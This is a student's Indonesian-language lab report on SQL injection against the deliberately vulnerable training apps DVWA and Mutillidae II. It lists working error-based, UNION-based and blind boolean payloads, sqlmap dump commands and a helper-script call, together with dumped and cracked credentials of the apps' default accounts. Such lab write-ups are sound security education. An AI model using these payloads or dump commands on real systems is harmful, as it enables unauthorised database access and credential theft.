# Dokumentasi SQL Injection — Bab 7
- Nama: Az Zahra Fiddien Al Farabi
- Kelas: B
- NRP: 5027251021

## Info Umum
- **Target**: DVWA (target utama) + Mutillidae II (latihan tambahan, lihat Bagian 6)
- **Security Level**: DVWA = low ; Mutillidae = 0 (Hosed)
- **DBMS terdeteksi**: MariaDB 10.1.26 (fork MySQL) — terbaca dari pesan error
- **Tanggal**: 14 Oktober 2026

## 1. Deteksi Error-Based
- **Payload**: `'` (satu petik tunggal) di field User ID
- **Pesan error yang muncul**:
  `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1`
- **Info yang terungkap dari pesan error**:
  - Konfirmasi ada celah SQLi (petik tunggal masuk ke query tanpa sanitasi → sintaks rusak).
  - DBMS = **MariaDB** (fork MySQL → sintaks MySQL berlaku: `database()`, `version()`, `information_schema`, komentar `-- -`).
  - Dari address bar diketahui input lewat **parameter GET `id`** (dipakai nanti untuk sqlmap).

<img width="1251" height="193" alt="image" src="https://github.com/user-attachments/assets/bdb6f757-735b-40ca-942c-8c8ddee2d3b9" />

## 2. UNION-Based Injection
 
| Langkah | Payload | Hasil |
|---|---|---|
| Menentukan jumlah kolom | `1' ORDER BY 1-- -` … `1' ORDER BY 3-- -` | `ORDER BY 1`,`2` OK; `ORDER BY 3` → `Unknown column '3' in 'order clause'` → **jumlah kolom = 2** |
| Ekstraksi database()/version() | `1' UNION SELECT database(), version()-- -` | database = **dvwa** ; version = **10.1.26-MariaDB-0+deb9u1** |
| Ekstraksi nama tabel | `1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -` | **guestbook**, **users** |
| Ekstraksi nama kolom | `1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -` | user_id, first_name, last_name, **user**, **password**, avatar, last_login, failed_login |
| Ekstraksi data users | `1' UNION SELECT user, password FROM users-- -` | 5 akun + hash MD5 (lihat tabel di bawah) |
 
**Data users hasil UNION:**
 
| user | password (MD5) |
|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
 
> Catatan: hash admin & smithy identik → password sama. `5f4dcc3b...` = MD5 dari kata `password`.
 
 ekstraksi nama tabel:
<img width="1813" height="499" alt="image" src="https://github.com/user-attachments/assets/07131ea5-c29a-4604-a1a3-61c787dc5de3" />


ekstraksi data users:
<img width="1918" height="715" alt="image" src="https://github.com/user-attachments/assets/8f2d92e4-a075-49ae-8651-be2d356564d0" />


## 3. Blind Boolean-Based (Manual)
 
Dilakukan di modul **SQL Injection (Blind)**. Oracle dikalibrasi dulu:
`1' AND 1=1-- -` → **exists** (true) ; `1' AND 1=2-- -` → **MISSING** (false).
 
| Posisi Karakter | Payload | True/False | Karakter Ditemukan |
|---|---|---|---|
| 1 | `1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5` | exists (True) | `5` |
| 2 | `1' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='f` | exists (True) | `f` |
| 3+ | `1' AND SUBSTRING((SELECT password FROM users LIMIT 1),3,1)='x` | (dilanjutkan oleh script) | `4` dst |
 
- **Hasil manual (beberapa karakter pertama)**: `5f...` (posisi 1 & 2 diverifikasi manual lewat browser)
- **Hasil lengkap via script**: `blind_sqli_helper.py` mengekstrak 32 karakter → **`5f4dcc3b5aa765d61d8327deb882cf99`** (identik dengan hasil UNION).
Perintah script:
```bash
python3 blind_sqli_helper.py \
  --url "http://localhost:8081/vulnerabilities/sqli_blind/" \
  --cookie "PHPSESSID=<PHPSESSID>; security=low"
```
 
- Bukti `1' AND 1=1-- -` yaitu “User ID exists in the database.”:
<img width="1918" height="297" alt="image" src="https://github.com/user-attachments/assets/36fda0b9-2f98-41a6-90ae-d5b5b8d545da" />


- Bukti `1' AND 1=2-- -` yaitu “User ID is MISSING from the database.”:
<img width="1918" height="400" alt="image" src="https://github.com/user-attachments/assets/d51f87f0-c138-446a-8459-5fc15c7c84c5" />


- Bukti `...SUBSTRING(...,1,1)='5` yaitu “User ID exists”:
<img width="1918" height="432" alt="image" src="https://github.com/user-attachments/assets/92177115-2e77-4463-ab8d-33171d077104" />


- Bukti DevTools Cookies (PHPSESSID, security=low):
<img width="1918" height="220" alt="image" src="https://github.com/user-attachments/assets/1b14653e-8e42-4d65-bdf9-fb3d946a7b43" />

- Bukti output `blind_sqli_helper.py`
<img width="1725" height="669" alt="image" src="https://github.com/user-attachments/assets/2f140c8b-043a-4547-ac58-9aadcc9e867b" />


## 4. Validasi dengan sqlmap
- **Command yang dipakai**:
```bash
  # Daftar database
  sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=<PHPSESSID>; security=low" --dbs
 
  # Daftar tabel di dvwa
  sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=<PHPSESSID>; security=low" -D dvwa --tables
 
  # Dump tabel users (+ crack hash)
  sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=<PHPSESSID>; security=low" -D dvwa -T users --dump
```
- **Tipe injeksi yang dideteksi sqlmap**: boolean-based blind, error-based (EXTRACTVALUE), time-based blind (SLEEP), UNION query (2 columns) — back-end: MySQL >= 5.1 (MariaDB fork).
- **Database ditemukan**: `dvwa`, `information_schema`
- **Tabel ditemukan**: `guestbook`, `users`
- **Data hasil dump (ringkas)** — hash + plaintext hasil dictionary crack:
  | user | password (hash) | cracked |
  |---|---|---|
  | admin | 5f4dcc3b... | password |
  | gordonb | e99a18c4... | abc123 |
  | 1337 | 8d3533d7... | charley |
  | pablo | 0d107d09... | letmein |
  | smithy | 5f4dcc3b... | password |

- Bukti daftar database:
<img width="1908" height="700" alt="image" src="https://github.com/user-attachments/assets/6f67d6f6-0998-433e-8feb-13b4796fffee" />


- Bukti daftar tabel di dvwa:
<img width="1876" height="747" alt="image" src="https://github.com/user-attachments/assets/f0d35cfa-35f3-4a61-9467-fe1dbf162c7a" />

- Bukti dump tabel users (+ crack hash):
<img width="1918" height="736" alt="image" src="https://github.com/user-attachments/assets/db724680-c843-4ddf-85f4-c7ef0c091509" />

## 5. Perbandingan Waktu Manual vs Otomatis
 
| Metode | Cakupan | Waktu |
|---|---|---|
| Blind manual (browser) | 2–3 karakter | beberapa menit untuk segelintir karakter |
| Blind helper (script) | 1 hash penuh (32 karakter) | 01:03 → 01:05 ≈ **2 menit** |
| sqlmap (wall-clock, termasuk jawab prompt) | deteksi 4 tipe + 2 DB + dump + crack | 01:06 → 01:09 ≈ **3 menit** |
| sqlmap (waktu mesin, dari log) | idem | 14:06:54 → 14:08:26 ≈ **1,5 menit** |
 
**Ekstrapolasi**: jika manual butuh ~2–3 menit untuk 3 karakter, maka 32 karakter ≈ **20–30 menit** untuk **satu** hash (belum termasuk crack). Script menuntaskannya dalam 2 menit; sqlmap bahkan sekaligus crack 5 hash + dump penuh.
 
**Refleksi — kapan validasi manual tetap penting meski ada sqlmap?**
 
> Dari praktikum ini, saya melihat bahwa sqlmap jauh lebih cepat daripada pengujian manual. Dalam hitungan menit, sqlmap mampu mendeteksi berbagai tipe injeksi, melakukan dump database, dan memecahkan hash. Namun, kecepatan tersebut tidak berarti kita bisa mengabaikan pemahaman dasar.
Pengalaman manual membantu saya memahami output sqlmap, seperti boolean-based blind, UNION query, dan error-based injection. Selain itu, validasi manual berguna ketika tool gagal mendeteksi celah, sekaligus membantu mengurangi request yang berlebihan dan meminimalkan risiko kerusakan pada sistem produksi.
Kesimpulannya, sqlmap unggul dalam kecepatan dan otomatisasi, sedangkan pengujian manual penting untuk memahami, memvalidasi, dan mengendalikan proses pengujian. Keduanya sebaiknya digunakan bersama agar pengujian lebih efektif, terukur, dan tetap sesuai batas izin.
 
1. **Memahami sebelum mengotomasi.** Output sqlmap (`boolean-based`, `UNION 2 columns`, `error-based EXTRACTVALUE`) baru benar-benar bisa dibaca karena tekniknya sudah pernah dikerjakan manual. Tanpa fondasi itu, sqlmap jadi kotak hitam yang hasilnya ditelan mentah.
2. **Saat sqlmap gagal atau terhalang.** WAF, filter input, atau endpoint non-standar sering membuat sqlmap buntu. Probe manual (`'`, `ORDER BY`, `UNION`) memastikan celahnya memang ada sebelum menyalahkan tool, dan membantu merancang payload khusus (`--tamper`).
3. **Kebisingan & jejak.** sqlmap mengirim ratusan request (log menunjukkan 182 HTTP requests) — berisik dan mudah terdeteksi IDS/WAF. Untuk konfirmasi awal, satu-dua probe manual jauh lebih senyap.
4. **Menghindari kerusakan.** Pada sistem produksi, automasi (apalagi risk tinggi atau `--dump` besar) berpotensi membebani database atau mengubah data. Validasi manual yang terukur lebih aman.
5. **Legal & scope.** Konfirmasi manual secukupnya sebelum melepas automasi penuh membantu tetap berada di dalam batas izin pengujian.
**Kesimpulan**: sqlmap unggul telak dalam kecepatan dan kelengkapan, tapi validasi manual tetap diperlukan untuk memahami, mengatasi hambatan, menjaga kehati-hatian, dan bekerja senyap. Idealnya keduanya dipakai bersama: manual untuk konfirmasi & pemahaman, sqlmap untuk eksekusi skala penuh.
 
## 6. Latihan Tambahan di Mutillidae II
 
- **Skenario yang dicoba**: halaman **User Lookup (SQL)** — `OWASP 2017 → A1 Injection (SQL) → SQLi Extract Data → User Info (SQL)`. Security Level 0 (Hosed). DBMS: MySQL 5.5.60.
- **Langkah & hasil**:
  | Tahap | Payload (field Name) | Hasil |
  |---|---|---|
  | Deteksi error | `'` | errno 1064; query bocor: `SELECT * FROM accounts WHERE username='...' AND password=''` → tabel = **accounts** |
  | Jumlah kolom | `' ORDER BY 1-- -` … `' ORDER BY 8-- -` | `7` OK; `8` → `Unknown column '8'` → **7 kolom** |
  | Petakan slot tampil | `' UNION SELECT 1,2,3,4,5,6,7-- -` | kolom **2,3,4** tampil (Username, Password, Signature) |
  | Identitas DB | `' UNION SELECT 1,database(),version(),4,5,6,7-- -` | database = **mutillidae** ; version = **5.5.60-0ubuntu0.14.04.1** |
  | Ekstraksi data | `' UNION SELECT 1,username,password,4,5,6,7 FROM accounts-- -` | **23 akun**, password **plaintext** |
- **Contoh data (plaintext)**: admin/adminpass, adrian/somepassword, john/monkey, jeremy/password, bryce/password, samurai/samurai, … (23 total)
- **Perbedaan kunci vs DVWA**:
  - Jumlah kolom 7 (DVWA: 2) → payload UNION menyesuaikan.
  - Ada `AND password='...'` setelah input → perlu komentar `-- -` untuk memotongnya.
  - Hanya kolom 2,3,4 yang dicetak → data ditaruh di slot itu.
  - Password disimpan **plaintext** (DVWA: hash MD5) → lebih buruk secara keamanan; tak perlu crack.
  - Error Mutillidae membocorkan query utuh + path file → tambahan kerentanan *verbose error disclosure*.

- Bukti deteksi error `'`  errno 1064, query bocor, tabel accounts:
<img width="1735" height="493" alt="image" src="https://github.com/user-attachments/assets/d7769c37-9485-4a72-942a-299f9a90dfe8" />


- Bukti `' ORDER BY 8-- -`: 
<img width="1702" height="673" alt="image" src="https://github.com/user-attachments/assets/5c3ef393-6ca2-4161-bbb6-bd465d6bc568" />

- Bukti `' UNION SELECT 1,2,3,4,5,6,7-- -`:
<img width="1668" height="339" alt="image" src="https://github.com/user-attachments/assets/a3122bc4-f69e-468e-96c2-89e9b1e8b7ab" />

- Bukti `' UNION SELECT 1,database(),version(),4,5,6,7-- -`:
<img width="1714" height="319" alt="image" src="https://github.com/user-attachments/assets/ed323020-72e1-4c73-8b6a-9714e11f5e6c" />

- Bukti `' UNION SELECT 1,username,password,4,5,6,7 FROM accounts-- -`:
<img width="1729" height="706" alt="image" src="https://github.com/user-attachments/assets/d50e5047-4a67-4865-bf26-83feb8216034" />

